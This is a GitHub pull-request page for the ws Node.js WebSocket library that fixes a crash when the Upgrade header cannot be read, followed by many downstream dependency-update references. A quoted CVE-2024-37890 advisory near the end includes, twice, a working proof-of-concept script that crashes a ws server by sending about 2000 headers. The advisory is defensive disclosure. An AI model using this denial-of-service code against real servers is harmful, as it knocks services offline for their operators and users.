
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fwebsockets%2Fws%2Fpull%2F2231)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fwebsockets%2Fws%2Fpull%2F2231)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=websockets%2Fws)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[websockets](/websockets)
/
**[ws](/websockets/ws)**
Public

* [Notifications](/login?return_to=%2Fwebsockets%2Fws) You must be signed in to change notification settings
* [Fork
  2.5k](/login?return_to=%2Fwebsockets%2Fws)
* [Star
   21.9k](/login?return_to=%2Fwebsockets%2Fws)

* [Code](/websockets/ws)
* [Issues
  6](/websockets/ws/issues)
* [Pull requests
  0](/websockets/ws/pulls)
* [Actions](/websockets/ws/actions)
* [Security](/websockets/ws/security)
* [Insights](/websockets/ws/pulse)

Additional navigation options

* [Code](/websockets/ws)
* [Issues](/websockets/ws/issues)
* [Pull requests](/websockets/ws/pulls)
* [Actions](/websockets/ws/actions)
* [Security](/websockets/ws/security)
* [Insights](/websockets/ws/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fwebsockets%2Fws%2Fissues%2Fnew%2Fchoose)

By clicking â€œSign up for GitHubâ€, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). Weâ€™ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fwebsockets%2Fws%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Fix crash when the Upgrade header cannot be read #2231

 Merged

[lpinca](/lpinca)
merged 1 commit into
[master](/websockets/ws/tree/master "websockets/ws:master")
from
[fix/issue-2230](/websockets/ws/tree/fix/issue-2230 "websockets/ws:fix/issue-2230")

Jun 16, 2024

 Merged

# [Fix crash when the Upgrade header cannot be read](#top) #2231

[lpinca](/lpinca)
merged 1 commit into
[master](/websockets/ws/tree/master "websockets/ws:master")
from
[fix/issue-2230](/websockets/ws/tree/fix/issue-2230 "websockets/ws:fix/issue-2230")

Jun 16, 2024

[Conversation
0](/websockets/ws/pull/2231)
[Commits
1](/websockets/ws/pull/2231/commits)
[Checks
56](/websockets/ws/pull/2231/checks)
[Files changed](/websockets/ws/pull/2231/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![lpinca](https://avatars.githubusercontent.com/u/1443911?s=60&v=4)](/lpinca)

Copy link

Member

### @lpinca **[lpinca](/lpinca)** commented [Jun 15, 2024](#issue-2355202628) â€¢ edited Loading

It is possible that the Upgrade header is correctly received and handled

(the `'upgrade'` event is emitted) without its value being returned to

the user. This can happen if the number of received headers exceed the

`server.maxHeadersCount` or `request.maxHeadersCount` threshold. In this

case `incomingMessage.headers.upgrade` may not be set.

Handle the case correctly and abort the handshake.

Fixes [#2230](https://github.com/websockets/ws/issues/2230)

Sorry, something went wrong.

 ðŸ‘
2
 dm1triisolovev and zhibirc reacted with thumbs up emoji
 ðŸ‘€
1
 Nul-led reacted with eyes emoji

All reactions

* ðŸ‘
  2 reactions
* ðŸ‘€
  1 reaction

[![@lpinca](https://avatars.githubusercontent.com/u/1443911?s=40&v=4)](/lpinca)
[lpinca](/lpinca)
mentioned this pull request
[Jun 15, 2024](#ref-issue-2354846108)

[Throws TypeError when there are too many HTTP headers
#2230](/websockets/ws/issues/2230)

Closed

1 task

[![@lpinca](https://avatars.githubusercontent.com/u/1443911?s=40&v=4)](/lpinca)

`[[security] Fix crash when the Upgrade header cannot be read](/websockets/ws/pull/2231/commits/dec10b689d628f599ccc0940d67344780bbea1ae "[security] Fix crash when the Upgrade header cannot be read

It is possible that the Upgrade header is correctly received and handled
(the `'upgrade'` event is emitted) without its value being returned to
the user. This can happen if the number of received headers exceed the
`server.maxHeadersCount` or `request.maxHeadersCount` threshold. In this
case `incomingMessage.headers.upgrade` may not be set.

Handle the case correctly and abort the handshake.

Fixes #2230")`
 â€¦

`[dec10b6](/websockets/ws/pull/2231/commits/dec10b689d628f599ccc0940d67344780bbea1ae)`

```
It is possible that the Upgrade header is correctly received and handled
(the `'upgrade'` event is emitted) without its value being returned to
the user. This can happen if the number of received headers exceed the
`server.maxHeadersCount` or `request.maxHeadersCount` threshold. In this
case `incomingMessage.headers.upgrade` may not be set.

Handle the case correctly and abort the handshake.

Fixes [#2230](https://github.com/websockets/ws/issues/2230)
```

 [![@lpinca](https://avatars.githubusercontent.com/u/1443911?s=40&v=4)](/lpinca)
[lpinca](/lpinca)
[force-pushed](/websockets/ws/compare/e009fc7b035dd7acea63b7dd4c3d003818377021..dec10b689d628f599ccc0940d67344780bbea1ae)
the
fix/issue-2230

branch
from
[`e009fc7`](/websockets/ws/commit/e009fc7b035dd7acea63b7dd4c3d003818377021) to
[`dec10b6`](/websockets/ws/commit/dec10b689d628f599ccc0940d67344780bbea1ae)  [Compare](/websockets/ws/compare/e009fc7b035dd7acea63b7dd4c3d003818377021..dec10b689d628f599ccc0940d67344780bbea1ae)
[June 16, 2024 09:18](#event-13174719726)

[![@lpinca](https://avatars.githubusercontent.com/u/1443911?s=40&v=4)](/lpinca)
[lpinca](/lpinca)
changed the title
~~Abort the handshake if the Upgrade header cannot be validated~~
Fix crash when the Upgrade header cannot be read
[Jun 16, 2024](#event-13174723447)

 Hide details
View details

[![@lpinca](https://avatars.githubusercontent.com/u/1443911?s=40&v=4)](/lpinca)
[lpinca](/lpinca)
merged commit [`fac8994`](/websockets/ws/commit/fac8994f104ff55a64a9d8128e1346d30997de78)
into
master

[Jun 16, 2024](https://github.com/websockets/ws/pull/2231#event-13174834729)
85 checks passed

 [![@lpinca](https://avatars.githubusercontent.com/u/1443911?s=40&v=4)](/lpinca)
[lpinca](/lpinca)
deleted the
fix/issue-2230

branch
[June 16, 2024 09:30](#event-13174834824)

[lpinca](/lpinca)
added a commit
that referenced
this pull request
[Jun 16, 2024](#ref-commit-e55e510)
[![@lpinca](https://avatars.githubusercontent.com/u/1443911?s=40&v=4)](/lpinca)

`[[security] Fix crash when the Upgrade header cannot be read (](/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c "[security] Fix crash when the Upgrade header cannot be read (#2231)

It is possible that the Upgrade header is correctly received and handled
(the `'upgrade'` event is emitted) without its value being returned to
the user. This can happen if the number of received headers exceed the
`server.maxHeadersCount` or `request.maxHeadersCount` threshold. In this
case `incomingMessage.headers.upgrade` may not be set.

Handle the case correctly and abort the handshake.

Fixes #2230")[#2231](https://github.com/websockets/ws/pull/2231)[)](/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c "[security] Fix crash when the Upgrade header cannot be read (#2231)

It is possible that the Upgrade header is correctly received and handled
(the `'upgrade'` event is emitted) without its value being returned to
the user. This can happen if the number of received headers exceed the
`server.maxHeadersCount` or `request.maxHeadersCount` threshold. In this
case `incomingMessage.headers.upgrade` may not be set.

Handle the case correctly and abort the handshake.

Fixes #2230")`
â€¦

`[e55e510](/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c)`

```
It is possible that the Upgrade header is correctly received and handled
(the `'upgrade'` event is emitted) without its value being returned to
the user. This can happen if the number of received headers exceed the
`server.maxHeadersCount` or `request.maxHeadersCount` threshold. In this
case `incomingMessage.headers.upgrade` may not be set.

Handle the case correctly and abort the handshake.

Fixes [#2230](https://github.com/websockets/ws/issues/2230)
```

[lpinca](/lpinca)
added a commit
that referenced
this pull request
[Jun 16, 2024](#ref-commit-4abd8f6)
[![@lpinca](https://avatars.githubusercontent.com/u/1443911?s=40&v=4)](/lpinca)

`[[security] Fix crash when the Upgrade header cannot be read (](/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e "[security] Fix crash when the Upgrade header cannot be read (#2231)

It is possible that the Upgrade header is correctly received and handled
(the `'upgrade'` event is emitted) without its value being returned to
the user. This can happen if the number of received headers exceed the
`server.maxHeadersCount` or `request.maxHeadersCount` threshold. In this
case `incomingMessage.headers.upgrade` may not be set.

Handle the case correctly and abort the handshake.

Fixes #2230")[#2231](https://github.com/websockets/ws/pull/2231)[)](/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e "[security] Fix crash when the Upgrade header cannot be read (#2231)

It is possible that the Upgrade header is correctly received and handled
(the `'upgrade'` event is emitted) without its value being returned to
the user. This can happen if the number of received headers exceed the
`server.maxHeadersCount` or `request.maxHeadersCount` threshold. In this
case `incomingMessage.headers.upgrade` may not be set.

Handle the case correctly and abort the handshake.

Fixes #2230")`
â€¦

`[4abd8f6](/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e)`

```
It is possible that the Upgrade header is correctly received and handled
(the `'upgrade'` event is emitted) without its value being returned to
the user. This can happen if the number of received headers exceed the
`server.maxHeadersCount` or `request.maxHeadersCount` threshold. In this
case `incomingMessage.headers.upgrade` may not be set.

Handle the case correctly and abort the handshake.

Fixes [#2230](https://github.com/websockets/ws/issues/2230)
```

[lpinca](/lpinca)
added a commit
that referenced
this pull request
[Jun 16, 2024](#ref-commit-85783fb)
[![@lpinca](https://avatars.githubusercontent.com/u/1443911?s=40&v=4)](/lpinca)

`[[security] Fix crash when the Upgrade header cannot be read (](/websockets/ws/commit/85783fbbf32b59480f66a244fdcf6e5101621a2a "[security] Fix crash when the Upgrade header cannot be read (#2231)

It is possible that the Upgrade header is correctly received and handled
(the `'upgrade'` event is emitted) without its value being returned to
the user. This can happen if the number of received headers exceed the
`server.maxHeadersCount` or `request.maxHeadersCount` threshold. In this
case `incomingMessage.headers.upgrade` may not be set.

Handle the case correctly and abort the handshake.

Fixes #2230")[#2231](https://github.com/websockets/ws/pull/2231)[)](/websockets/ws/commit/85783fbbf32b59480f66a244fdcf6e5101621a2a "[security] Fix crash when the Upgrade header cannot be read (#2231)

It is possible that the Upgrade header is correctly received and handled
(the `'upgrade'` event is emitted) without its value being returned to
the user. This can happen if the number of received headers exceed the
`server.maxHeadersCount` or `request.maxHeadersCount` threshold. In this
case `incomingMessage.headers.upgrade` may not be set.

Handle the case correctly and abort the handshake.

Fixes #2230")`
â€¦

`[85783fb](/websockets/ws/commit/85783fbbf32b59480f66a244fdcf6e5101621a2a)`

```
It is possible that the Upgrade header is correctly received and handled
(the `'upgrade'` event is emitted) without its value being returned to
the user. This can happen if the number of received headers exceed the
`server.maxHeadersCount` or `request.maxHeadersCount` threshold. In this
case `incomingMessage.headers.upgrade` may not be set.

Handle the case correctly and abort the handshake.

Fixes [#2230](https://github.com/websockets/ws/issues/2230)
```

[lpinca](/lpinca)
added a commit
that referenced
this pull request
[Jun 16, 2024](#ref-commit-22c2876)
[![@lpinca](https://avatars.githubusercontent.com/u/1443911?s=40&v=4)](/lpinca)

`[[security] Fix crash when the Upgrade header cannot be read (](/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f "[security] Fix crash when the Upgrade header cannot be read (#2231)

It is possible that the Upgrade header is correctly received and handled
(the `'upgrade'` event is emitted) without its value being returned to
the user. This can happen if the number of received headers exceed the
`server.maxHeadersCount` or `request.maxHeadersCount` threshold. In this
case `incomingMessage.headers.upgrade` may not be set.

Handle the case correctly and abort the handshake.

Fixes #2230")[#2231](https://github.com/websockets/ws/pull/2231)[)](/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f "[security] Fix crash when the Upgrade header cannot be read (#2231)

It is possible that the Upgrade header is correctly received and handled
(the `'upgrade'` event is emitted) without its value being returned to
the user. This can happen if the number of received headers exceed the
`server.maxHeadersCount` or `request.maxHeadersCount` threshold. In this
case `incomingMessage.headers.upgrade` may not be set.

Handle the case correctly and abort the handshake.

Fixes #2230")`
â€¦

`[22c2876](/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f)`

```
It is possible that the Upgrade header is correctly received and handled
(the `'upgrade'` event is emitted) without its value being returned to
the user. This can happen if the number of received headers exceed the
`server.maxHeadersCount` or `request.maxHeadersCount` threshold. In this
case `incomingMessage.headers.upgrade` may not be set.

Handle the case correctly and abort the handshake.

Fixes [#2230](https://github.com/websockets/ws/issues/2230)
```

[lpinca](/lpinca)
added a commit
that referenced
this pull request
[Jun 16, 2024](#ref-commit-eeb76d3)
[![@lpinca](https://avatars.githubusercontent.com/u/1443911?s=40&v=4)](/lpinca)

`[[security] Fix crash when the Upgrade header cannot be read (](/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63 "[security] Fix crash when the Upgrade header cannot be read (#2231)

It is possible that the Upgrade header is correctly received and handled
(the `'upgrade'` event is emitted) without its value being returned to
the user. This can happen if the number of received headers exceed the
`server.maxHeadersCount` or `request.maxHeadersCount` threshold. In this
case `incomingMessage.headers.upgrade` may not be set.

Handle the case correctly and abort the handshake.

Fixes #2230")[#2231](https://github.com/websockets/ws/pull/2231)[)](/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63 "[security] Fix crash when the Upgrade header cannot be read (#2231)

It is possible that the Upgrade header is correctly received and handled
(the `'upgrade'` event is emitted) without its value being returned to
the user. This can happen if the number of received headers exceed the
`server.maxHeadersCount` or `request.maxHeadersCount` threshold. In this
case `incomingMessage.headers.upgrade` may not be set.

Handle the case correctly and abort the handshake.

Fixes #2230")`
â€¦

`[eeb76d3](/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63)`

```
It is possible that the Upgrade header is correctly received and handled
(the `'upgrade'` event is emitted) without its value being returned to
the user. This can happen if the number of received headers exceed the
`server.maxHeadersCount` or `request.maxHeadersCount` threshold. In this
case `incomingMessage.headers.upgrade` may not be set.

Handle the case correctly and abort the handshake.

Fixes [#2230](https://github.com/websockets/ws/issues/2230)
```

[![@mina86](https://avatars.githubusercontent.com/u/32383?s=40&u=a457bfad9c4a0f05b652d14184341d971c81f285&v=4)](/mina86)
[mina86](/mina86)
mentioned this pull request
[Jun 18, 2024](#ref-pullrequest-2360601036)

[build(deps): bump ws from 7.5.9 to 7.5.10
ComposableFi/emulated-light-client#347](/ComposableFi/emulated-light-client/pull/347)
 Merged

[mina86](/mina86)
pushed a commit
to ComposableFi/emulated-light-client
that referenced
this pull request
[Jun 18, 2024](#ref-commit-08ffbb0)
[![@dependabot](https://avatars.githubusercontent.com/in/29110?s=40&v=4)](/apps/dependabot)

`[build(deps): bump ws from 7.5.9 to 7.5.10 (](/ComposableFi/emulated-light-client/commit/08ffbb06562a3e3bc8c2ec32d207366093968aed "build(deps): bump ws from 7.5.9 to 7.5.10 (#347)

Bumps ws from 7.5.9 to 7.5.10 to address crash when the Upgrade header
cannot be read.  See https://github.com/websockets/ws/pull/2231.")[#347](https://github.com/ComposableFi/emulated-light-client/pull/347)[)](/ComposableFi/emulated-light-client/commit/08ffbb06562a3e3bc8c2ec32d207366093968aed "build(deps): bump ws from 7.5.9 to 7.5.10 (#347)

Bumps ws from 7.5.9 to 7.5.10 to address crash when the Upgrade header
cannot be read.  See https://github.com/websockets/ws/pull/2231.")`
â€¦

`[08ffbb0](/ComposableFi/emulated-light-client/commit/08ffbb06562a3e3bc8c2ec32d207366093968aed)`

```
Bumps ws from 7.5.9 to 7.5.10 to address crash when the Upgrade header
cannot be read.  See [websockets/ws#2231](https://github.com/websockets/ws/pull/2231).
```

[![@ojengwa](https://avatars.githubusercontent.com/u/3935007?s=40&v=4)](/ojengwa)
[ojengwa](/ojengwa)
mentioned this pull request
[Jun 18, 2024](#ref-issue-2360824069)

[Upgrade WS dependency - ws affected by a DoS when handling a request with many HTTP headers
nestjs/graphql#3215](/nestjs/graphql/issues/3215)

Closed

4 tasks

[![@PavelMor25](https://avatars.githubusercontent.com/u/77216072?s=40&v=4)](/PavelMor25)
[PavelMor25](/PavelMor25)
mentioned this pull request
[Jun 19, 2024](#ref-issue-2361070219)

[ws affected by a DoS when handling a request with many HTTP headers
PavelMor25/testcafe-private#84](/PavelMor25/testcafe-private/issues/84)

Open

1 task

[![@Knightplayzz](https://avatars.githubusercontent.com/u/73634415?s=40&v=4)](/Knightplayzz)
[Knightplayzz](/Knightplayzz)
mentioned this pull request
[Jun 21, 2024](#ref-issue-2366767367)

[ws affected by a DoS when handling a request with many HTTP headers
discordjs/discord.js#10359](/discordjs/discord.js/issues/10359)

Closed

[![@debricked](https://avatars.githubusercontent.com/in/24490?s=40&v=4)](/apps/debricked)
[debricked](/apps/debricked)
bot
mentioned this pull request
[Jun 22, 2024](#ref-pullrequest-2367369507)

[Fix CVEâ€“2024â€“37890
black-da-bull/gpt-crawler#4](/black-da-bull/gpt-crawler/pull/4)
 Closed

[![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)](/apps/github-actions)
[github-actions](/apps/github-actions)
bot
mentioned this pull request
[Jun 22, 2024](#ref-pullrequest-2367441576)

[chore(deps): update dependency coder/code-server to v4.90.3
uniget-org/tools#5476](/uniget-org/tools/pull/5476)
 Merged

1 task

[![@torokati44](https://avatars.githubusercontent.com/u/288816?s=40&v=4)](/torokati44)
[torokati44](/torokati44)
mentioned this pull request
[Jun 24, 2024](#ref-pullrequest-2370326897)

[chore: web: Regenerate `package-lock.json`
ruffle-rs/ruffle#16863](/ruffle-rs/ruffle/pull/16863)
 Merged

[chinthliss](/chinthliss)
added a commit
to chinthliss/MuckWebInterface
that referenced
this pull request
[Jun 25, 2024](#ref-commit-14b3561)
[![@chinthliss](https://avatars.githubusercontent.com/u/55845146?s=40&v=4)](/chinthliss)

`[build: Update dependencies to fix warning](/chinthliss/MuckWebInterface/commit/14b356133f9c34999dbb6a738cca0df5dc611d65 "build: Update dependencies to fix warning

In particular:
websockets/ws#2230
websockets/ws#2231")`
â€¦

`[14b3561](/chinthliss/MuckWebInterface/commit/14b356133f9c34999dbb6a738cca0df5dc611d65)`

```
In particular:
[websockets/ws#2230](https://github.com/websockets/ws/issues/2230)
[websockets/ws#2231](https://github.com/websockets/ws/pull/2231)
```

[![@elischutze](https://avatars.githubusercontent.com/u/5872126?s=40&v=4)](/elischutze)
[elischutze](/elischutze)
mentioned this pull request
[Jun 26, 2024](#ref-issue-2375944183)

[Security vulnerability in ws package, upgrade to at least 8.17.1
tedeh/jayson#229](/tedeh/jayson/issues/229)

Closed

[![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)](/apps/github-actions)
[github-actions](/apps/github-actions)
bot
mentioned this pull request
[Jun 26, 2024](#ref-pullrequest-2376301120)

[Added decktape
uniget-org/tools#5562](/uniget-org/tools/pull/5562)
 Merged

This was referenced Jul 7, 2024

[[Snyk] Upgrade ws from 8.13.0 to 8.17.1
X-oss-byte/ccxt#47](/X-oss-byte/ccxt/pull/47)
 Open

[[Snyk] Upgrade ws from 8.2.3 to 8.17.1
X-oss-byte/ganache#623](/X-oss-byte/ganache/pull/623)
 Open

[![@Exkaleburx](https://avatars.githubusercontent.com/u/162898168?s=40&v=4)](/Exkaleburx)
[Exkaleburx](/Exkaleburx)
mentioned this pull request
[Jul 7, 2024](#ref-pullrequest-2394180516)

[[Snyk] Upgrade ws from 8.16.0 to 8.17.1
Exkaleburx/ccxt#35](/Exkaleburx/ccxt/pull/35)
 Open

[![@NOUIY](https://avatars.githubusercontent.com/u/95175571?s=40&v=4)](/NOUIY)
[NOUIY](/NOUIY)
mentioned this pull request
[Jul 8, 2024](#ref-pullrequest-2394462692)

[[Snyk] Upgrade ws from 8.12.0 to 8.17.1
NOUIY/vscode-extension-samples#773](/NOUIY/vscode-extension-samples/pull/773)
 Open

[![@Ramyromel](https://avatars.githubusercontent.com/u/122599979?s=40&v=4)](/Ramyromel)
[Ramyromel](/Ramyromel)
mentioned this pull request
[Jul 8, 2024](#ref-pullrequest-2394563545)

[[Snyk] Upgrade ws from 8.17.0 to 8.17.1
Ramyromel/polkadot-wiki#5](/Ramyromel/polkadot-wiki/pull/5)
 Open

[![@taeb3](https://avatars.githubusercontent.com/u/73064242?s=40&v=4)](/taeb3)
[taeb3](/taeb3)
mentioned this pull request
[Jul 8, 2024](#ref-pullrequest-2394678480)

[[Snyk] Upgrade ws from 7.5.10 to 8.17.1
taeb3/gitlabs#139](/taeb3/gitlabs/pull/139)
 Open

[![@FaroukAmr](https://avatars.githubusercontent.com/u/50875890?s=40&v=4)](/FaroukAmr)
[FaroukAmr](/FaroukAmr)
mentioned this pull request
[Jul 8, 2024](#ref-pullrequest-2394746800)

[[Snyk] Upgrade ws from 8.11.0 to 8.17.1
FaroukAmr/Web-Application#1043](/FaroukAmr/Web-Application/pull/1043)
 Open

[![@rater193](https://avatars.githubusercontent.com/u/6468037?s=40&v=4)](/rater193)
[rater193](/rater193)
mentioned this pull request
[Jul 8, 2024](#ref-pullrequest-2395059264)

[[Snyk] Upgrade ws from 8.2.3 to 8.17.1
Homestead-Game-Development/Voxels-Edge-Server#27](/Homestead-Game-Development/Voxels-Edge-Server/pull/27)
 Open

22 hidden items

Load moreâ€¦

[![@INexizI](https://avatars.githubusercontent.com/u/39536903?s=40&v=4)](/INexizI)
[INexizI](/INexizI)
mentioned this pull request
[Aug 7, 2024](#ref-pullrequest-2452980024)

[[Snyk] Upgrade ws from 8.17.1 to 8.18.0
INexizI/KR-DB#380](/INexizI/KR-DB/pull/380)
 Merged

[github-merge-queue](/apps/github-merge-queue) bot
referenced
this pull request
in camunda/camunda
[Aug 9, 2024](#ref-commit-d0eeedc)
[![@renovate](https://avatars.githubusercontent.com/in/2740?s=40&v=4)](/marketplace/renovate)

`[deps: Update dependency ws to v8.17.1 [SECURITY] (main) (](/camunda/camunda/commit/d0eeedcfec0669b66458957d545a4e8c4fac52cd "deps: Update dependency ws to v8.17.1 [SECURITY] (main) (#20945)

[![Mend
Renovate](https://app.renovatebot.com/images/banner.svg)](https://renovatebot.com)

This PR contains the following updates:

| Package | Change | Age | Adoption | Passing | Confidence |
|---|---|---|---|---|---|
| [ws](https://togithub.com/websockets/ws) | [`8.17.0` ->
`8.17.1`](https://renovatebot.com/diffs/npm/ws/8.17.0/8.17.1) |
[![age](https://developer.mend.io/api/mc/badges/age/npm/ws/8.17.1?slim=true)](https://docs.renovatebot.com/merge-confidence/)
|
[![adoption](https://developer.mend.io/api/mc/badges/adoption/npm/ws/8.17.1?slim=true)](https://docs.renovatebot.com/merge-confidence/)
|
[![passing](https://developer.mend.io/api/mc/badges/compatibility/npm/ws/8.17.0/8.17.1?slim=true)](https://docs.renovatebot.com/merge-confidence/)
|
[![confidence](https://developer.mend.io/api/mc/badges/confidence/npm/ws/8.17.0/8.17.1?slim=true)](https://docs.renovatebot.com/merge-confidence/)
|

---

> [!WARNING]
> Some dependencies could not be looked up. Check the Dependency
Dashboard for more information.

### GitHub Vulnerability Alerts

####
[CVE-2024-37890](https://togithub.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q)

### Impact

A request with a number of headers exceeding
the[`server.maxHeadersCount`][] threshold could be used to crash a ws
server.

### Proof of concept

```js
const http = require('http');
const WebSocket = require('ws');

const wss = new WebSocket.Server({ port: 0 }, function () {
  const chars = \"!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~\".split('');
  const headers = {};
  let count = 0;

  for (let i = 0; i < chars.length; i++) {
    if (count === 2000) break;

    for (let j = 0; j < chars.length; j++) {
      const key = chars[i] + chars[j];
      headers[key] = 'x';

      if (++count === 2000) break;
    }
  }

  headers.Connection = 'Upgrade';
  headers.Upgrade = 'websocket';
  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';
  headers['Sec-WebSocket-Version'] = '13';

  const request = http.request({
    headers: headers,
    host: '127.0.0.1',
    port: wss.address().port
  });

  request.end();
});
```

### Patches

The vulnerability was fixed in ws@8.17.1
(https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c)
and backported to ws@7.5.10
(https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f),
ws@6.2.3
(https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63),
and ws@5.2.4
(https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e)

### Workarounds

In vulnerable versions of ws, the issue can be mitigated in the
following ways:

1. Reduce the maximum allowed length of the request headers using the
[`--max-http-header-size=size`][] and/or the [`maxHeaderSize`][] options
so that no more headers than the `server.maxHeadersCount` limit can be
sent.
2. Set `server.maxHeadersCount` to `0` so that no limit is applied.

### Credits

The vulnerability was reported by [Ryan
LaPointe](https://togithub.com/rrlapointe) in
[https://github.com/websockets/ws/issues/2230](https://togithub.com/websockets/ws/issues/2230).

### References

-
[https://github.com/websockets/ws/issues/2230](https://togithub.com/websockets/ws/issues/2230)
-
[https://github.com/websockets/ws/pull/2231](https://togithub.com/websockets/ws/pull/2231)

[`--max-http-header-size=size`]:
https://nodejs.org/api/cli.html#--max-http-header-sizesize
[`maxHeaderSize`]:
https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener
[`server.maxHeadersCount`]:
https://nodejs.org/api/http.html#servermaxheaderscount

---

### Release Notes

<details>
<summary>websockets/ws (ws)</summary>

### [`v8.17.1`](https://togithub.com/websockets/ws/releases/tag/8.17.1)

[Compare
Source](https://togithub.com/websockets/ws/compare/8.17.0...8.17.1)

### Bug fixes

- Fixed a DoS vulnerability
([#&#8203;2231](https://togithub.com/websockets/ws/issues/2231)).

A request with a number of headers exceeding
the[`server.maxHeadersCount`][server.maxHeadersCount]
threshold could be used to crash a ws server.

```js
const http = require('http');
const WebSocket = require('ws');

const wss = new WebSocket.Server({ port: 0 }, function () {
  const chars = \"!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~\".split('');
  const headers = {};
  let count = 0;

  for (let i = 0; i < chars.length; i++) {
    if (count === 2000) break;

    for (let j = 0; j < chars.length; j++) {
      const key = chars[i] + chars[j];
      headers[key] = 'x';

      if (++count === 2000) break;
    }
  }

  headers.Connection = 'Upgrade';
  headers.Upgrade = 'websocket';
  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';
  headers['Sec-WebSocket-Version'] = '13';

  const request = http.request({
    headers: headers,
    host: '127.0.0.1',
    port: wss.address().port
  });

  request.end();
});
```

The vulnerability was reported by [Ryan
LaPointe](https://togithub.com/rrlapointe) in
[https://github.com/websockets/ws/issues/2230](https://togithub.com/websockets/ws/issues/2230).

In vulnerable versions of ws, the issue can be mitigated in the
following ways:

1.  Reduce the maximum allowed length of the request headers using the
